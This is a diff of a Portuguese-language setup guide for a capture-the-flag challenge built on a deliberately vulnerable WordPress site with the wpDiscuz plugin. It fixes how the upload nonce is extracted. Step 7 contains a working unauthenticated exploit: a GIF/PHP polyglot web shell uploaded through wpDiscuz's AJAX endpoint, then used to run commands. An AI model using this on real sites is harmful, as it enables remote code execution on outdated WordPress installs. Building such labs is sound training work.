@@ -78,7 +78,10 @@ Acesse a **URL pública (ALVO)** no seu navegador e:
 2. **Plugins → Ativar** o **wpDiscuz**.
 3. **wpDiscuz → Settings** → seção de **upload/anexos**: ligue
    **"anexos de imagem"** e **"permitir que visitantes (guests) enviem arquivos"** (`wmuIsGuestAllowed`). Salve.
-4. Garanta um **post com comentários abertos** (o "Olá, mundo!" padrão já serve). Abra o post e confirme
+4. **wpDiscuz → Settings → Comment Thread Displaying → "Comment List Loading Type" → selecione "Load with page"** e salve.
+   > Sem isso o wpDiscuz carrega os comentários por AJAX ("lazy load") e o nonce **não** aparece no HTML cru —
+   > o navegador funciona (tem JS), mas o teste por `curl` falha. No fluxo navegador + Burp isso não atrapalha.
+5. Garanta um **post com comentários abertos** (o "Olá, mundo!" padrão já serve). Abra o post e confirme
    que o formulário do wpDiscuz aparece com o botão de anexo.
 
 ## Passo 7 — Testar o exploit (validação de ponta a ponta)
@@ -86,19 +89,21 @@ Rode de qualquer máquina (troque `ALVO`). Pegue o nonce e faça o upload:
 ```bash
 ALVO="https://XXXX.trycloudflare.com"
 
-# 1) pega o wmu_nonce da página do post
-NONCE=$(curl -s "$ALVO/?p=1" | grep -oE 'name="wmu_nonce" value="[a-f0-9]+"' | grep -oE '[a-f0-9]{6,}')
-echo "nonce=$NONCE"   # se vier vazio, copie o valor manualmente do HTML da página do post
+# 1) pega o NONCE de upload.
+#    ATENÇÃO: o wpDiscuz expõe o nonce num objeto JS (wpdiscuzAjaxObj.wmuSecurity),
+#    NÃO num <input name="wmu_nonce">. E use -L (o ?p=1 redireciona para o link bonito).
+NONCE=$(curl -sL "$ALVO/?p=1" | grep -oE '"wmuSecurity":"[a-f0-9]+"' | grep -oE '[a-f0-9]{10}' | head -1)
+echo "nonce=[$NONCE]"   # se vier vazio, veja "Problemas comuns"
 
-# 2) cria o polyglot e envia
+# 2) cria o polyglot (imagem + PHP) e envia como shell.php
 printf 'GIF89a\n<?php system($_GET["c"]); ?>\n' > shell.php
 curl -s "$ALVO/wp-admin/admin-ajax.php" \
   -F "action=wmuUploadFiles" -F "wmu_nonce=$NONCE" -F "postId=1" \
   -F "wmu_files[]=@shell.php;type=image/gif;filename=shell.php"
 # -> a resposta JSON traz a URL em wp-content/uploads/AAAA/MM/shell-<numeros>.php
 
-# 3) executa e lê a flag (troque pela URL retornada)
-curl "$ALVO/wp-content/uploads/2026/09/shell-<numeros>.php?c=cat%20/flag"
+# 3) executa e lê a flag (troque pela URL EXATA do JSON, com ano/mês corretos)
+curl "$ALVO/wp-content/uploads/AAAA/MM/shell-<numeros>.php?c=cat%20/flag"
 # esperado: SECOMPwn25{|)0n't_u$3_outdat3|)_plug1n_1n_y0ur_0utd@t3d_wor|)pres$_duuh!}
 ```
 Se a flag aparecer, está tudo certo. **Apague o `shell.php` de teste** (via `?c=rm ...`) se quiser começar limpo.
@@ -127,7 +132,7 @@ E **desligue/descarte a VM** (ou restaure o snapshot).
 - [ ] `docker compose -f docker-compose.hosted.yml up -d --build` rodando; `curl -I http://localhost:8080` = 200/302.
 - [ ] Túnel ativo e URL pública anotada (**ALVO**).
 - [ ] WordPress instalado **pela URL do túnel**.
-- [ ] wpDiscuz **ativado** e **upload de visitante ligado**.
+- [ ] wpDiscuz **ativado**, **upload de visitante ligado** e **Comment List Loading Type = "Load with page"**.
 - [ ] Post com comentários abertos existe.
 - [ ] Você **testou o exploit** e leu a flag pela URL pública.
 - [ ] Snapshot da VM tirado.
@@ -144,6 +149,7 @@ E **desligue/descarte a VM** (ou restaure o snapshot).
 |--------|----------------|---------|
 | Redirect para `localhost` / layout quebrado | WP instalado por `localhost` e não pela URL do túnel | Refaça a instalação pela URL do túnel (`down -v` e recomeçar) |
 | Upload responde `msgUploadingNotAllowed` | Upload de visitante desligado | wpDiscuz → Settings → ligar anexos + guests |
-| Resposta `-1` no upload | nonce inválido/expirado | Recapturar `wmu_nonce` da página do post |
+| Resposta `-1` no upload | nonce vazio/incorreto | O nonce é o `wmuSecurity` (objeto JS), não um input `wmu_nonce`; use `curl -sL` e extraia o `wmuSecurity` (ver Passo 7) |
+| `grep` do nonce retorna 0 | (a) `curl` sem `-L` pegou só o redirect; (b) "lazy load" ligado | Use `curl -sL`; e ligue **Comment List Loading Type → Load with page** |
 | URL do túnel mudou | Túnel efêmero reiniciado | Reabrir túnel e (se preciso) reinstalar WP pela nova URL, ou usar named tunnel/domínio fixo |
 | Porta 8080 ocupada na VM | Outro serviço usando 8080 | Trocar mapeamento no compose (ex.: `"8090:80"`) e apontar o túnel para 8090 |
